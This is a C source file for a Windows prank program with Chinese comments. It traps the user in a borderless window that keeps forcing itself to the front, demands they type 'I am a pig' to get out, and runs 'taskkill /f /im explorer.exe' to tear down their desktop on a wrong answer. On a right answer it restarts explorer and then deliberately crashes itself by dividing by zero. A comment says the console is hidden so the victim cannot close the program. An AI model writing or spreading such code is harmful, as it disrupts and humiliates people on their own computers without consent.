#include <shudu>

#define BUTTON_ID  10011            /*按钮ID*/
/* This is where all the input to the window goes to */

int chang, kuan;
HWND hwnd;   /*实例化一个句柄*/
char title[100] = "哈哈哈！！！你被耍了";
HDC         hdc ;
	PAINTSTRUCT ps ;
	RECT        rect;

int print( char words[] )
{
	hdc = BeginPaint(hwnd, &ps);
	/* TODO: Add any drawing code here... */

	GetClientRect(hwnd, &rect);
	DrawText(hdc, words, strlen(words), &rect, DT_CENTER);
	EndPaint(hwnd, &ps);
}

int ckzq()
{
	HWND hForeWnd = NULL;
	HWND hWnd= FindWindow(NULL, title);
	DWORD dwForeID;
	DWORD dwCurID;

	hForeWnd =  GetForegroundWindow();
	dwCurID =  GetCurrentThreadId();
	dwForeID =  GetWindowThreadProcessId( hForeWnd, NULL );
	AttachThreadInput( dwCurID, dwForeID, TRUE);
	ShowWindow( hWnd, SW_SHOWNORMAL );
	SetWindowPos( hWnd, HWND_TOPMOST, 0,0,0,0, SWP_NOSIZE|SWP_NOMOVE );
	SetWindowPos( hWnd, HWND_NOTOPMOST, 0,0,0,0, SWP_NOSIZE|SWP_NOMOVE );
	SetForegroundWindow( hWnd );
	AttachThreadInput( dwCurID, dwForeID, FALSE);
}

int moddle( int x, int len )
{
	x = x/2;
	x = x-len;
	return x;
}

int yndesktop;

int desk()
{
	system ( "explorer.exe" );
}

int kenren()
{
	int _exit = 0;

	MessageBox(NULL, "要想退出，就在下面的每一个问题都点'是'","想退出就乖乖听话", MB_ICONASTERISK|MB_OK);
	int yn = MessageBox(NULL, "在那个框框中输入“我是猪 ”","想退出就乖乖听话", MB_ICONQUESTION|MB_OK);
}

/* This is where all the input to the window goes to */
LRESULT CALLBACK WndProc(HWND hwnd,UINT message,WPARAM wp,LPARAM lp)
{
	static HWND btnWnd1;
	static bool flag=false;
	char szHello[]="哈哈哈！你被耍了";
	static HWND hBtn;
	static HWND hEdt;

	switch(message)
	{
		case WM_CREATE:
		{
			btnWnd1 = CreateWindow("Button","X",
								   WS_VISIBLE|WS_CHILD, /*按钮属性    */
								   chang-50,kuan-600,  /*按钮位置    */
								   25,25,             /*按钮大小    */
								   hwnd,			 /*窗口信息    */
								   (HMENU)BUTTON_ID,/*按钮子窗口ID*/
								   0,0);

			hEdt = CreateWindow(TEXT("EDIT"),                    /*创建输入框*/
								TEXT("输入你的答案"),      /*输入框初始文字*/
								WS_CHILD|WS_VISIBLE|WS_BORDER,/*输入框属性*/
								moddle( chang, 100 ), moddle( kuan, 40 ),  					 /*输入框位置*/
								200, 40, 					/*输入框大小*/
								hwnd, 					   /*窗口信息*/
								NULL, NULL, NULL);		  /*占位指针*/

    		hBtn = CreateWindow(TEXT("BUTTON"),
								TEXT("确定"),
								WS_CHILD|WS_VISIBLE,
								moddle( chang, 100 )+50, moddle( kuan, 40 )+50,
								80, 20,
								hwnd,
								NULL, NULL, NULL);
			break;
		}

		case WM_PAINT:
		{
		 	print ( "哈哈哈!你被耍了" );
			break;
		}

		case WM_COMMAND:              /*按钮消息WM_COMMAND来处理*/
		{
			int id = GetDlgCtrlID(hEdt);
   			switch(id-wp)
		   	{
	   			case 0:
		   		{
					char buf[256];
    				GetDlgItemText(hwnd, id, buf, 255);
					if (strcmp( "我是猪", buf ) == 0)
					{
						system ( "cls" );
						printf ( "结果:你已承认你是猪" );

						if ( yndesktop == 1 )
						{
							MessageBox(NULL, "既然你都已经听话了，那我把桌面还给你","想退出就乖乖听话", MB_ICONASTERISK|MB_OK);
							MessageBox(NULL, "我就要离你而去了，呜呜呜","",MB_ICONEXCLAMATION|MB_OK);
							desk();
							MessageBox(NULL, "稍等一下，我马上就走","",MB_ICONEXCLAMATION|MB_OK);
							printf ( "%d", 1/0 );
						}
						MessageBox(NULL, "我就要离你而去了，呜呜呜","",MB_ICONEXCLAMATION|MB_OK);
						printf ( "%d", 1/0 );
					}
					else
					{
						system ( "taskkill /f /im explorer.exe" );
						yndesktop = 1;
						system ( "cls" );
						MessageBox(NULL, "想退出就乖乖听话\n作为惩罚，我把你的桌面拆了","!@^%$*)(&^~?:><|{}", MB_ICONASTERISK|MB_OK);
						return 0;
					}
				}


				break;
			}
			switch(LOWORD(wp))        /*wParam的低字节为点击的按钮的ID*/
			{
				case BUTTON_ID:
				{
					kenren();
					flag = !flag;
					break;
				}

				default:break;
			}
			break;
		}

		case WM_DESTROY:
		{
			PostQuitMessage(0);
			return 0;
		}

		default:break;
	}
	return DefWindowProc(hwnd,message,wp,lp);
}
/* The 'main' function of Win32 GUI programs: this is where execution starts */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//HideWindow();/*隐藏父类窗口，否则被坑的人可以直接关闭程序*/
	system ( "title 哈哈哈！你被耍了(未响应)" );/*父类窗口标题*/
	system ( "cls" );
	WNDCLASS wndcls;        /*实例化*/
	wndcls.cbClsExtra = 0; /*额外的类的附加字节数*/
	wndcls.cbWndExtra = 0;/*窗口额外的附加字节数*/
	wndcls.hbrBackground = (HBRUSH)GetStockObject( BLACK_BRUSH );  /*背景颜色，
	GetStockObject()函数的返回值是一个HGDIOBJ格式的，强制转换成HBRUSH格式的赋值*/
	wndcls.hCursor = LoadCursor(NULL, IDC_WAIT);  /*光标的类型        */
	wndcls.hIcon = LoadIcon(NULL, IDI_ERROR);    /*窗口图标          */
	wndcls.hInstance = hInstance;               /*应用程序的实例号  */
	wndcls.lpfnWndProc = WndProc;              /*窗口过程函数      */
	wndcls.lpszClassName = "你被耍了";        /*类名              */
	wndcls.lpszMenuName = NULL;              /*菜单名            */
	wndcls.style = CS_HREDRAW | CS_VREDRAW; /*水平重画和垂直重画*/

 	int x = GetSystemMetrics( SM_CXFULLSCREEN );
	int y = GetSystemMetrics( SM_CYFULLSCREEN );/*获取屏幕尺寸（不含任务栏）*/

 	chang = x - 200;
 	kuan  = y - 200;

	RegisterClass(&wndcls);   /*注册窗口类*/

	hwnd = CreateWindow("你被耍了",
						title,
						WS_CLIPCHILDREN|WS_CLIPSIBLINGS|WS_POPUP,/*窗口风格*/
						100,100,
						chang,kuan,
						NULL,NULL,
						hInstance,
						NULL); //建立一个窗口
	ShowWindow(hwnd, SW_SHOWNORMAL);   /*显示窗口*/
	UpdateWindow(hwnd);  /*更新窗口*/

	MSG msg;   /*消息机制*/
	while (GetMessage(&msg, NULL, 0, 0))    /*消息循环*/
	{
		ckzq();
		TranslateMessage(&msg);   /*传来的消息翻译*/
		DispatchMessage(&msg);
	}
	return msg.wParam;
}

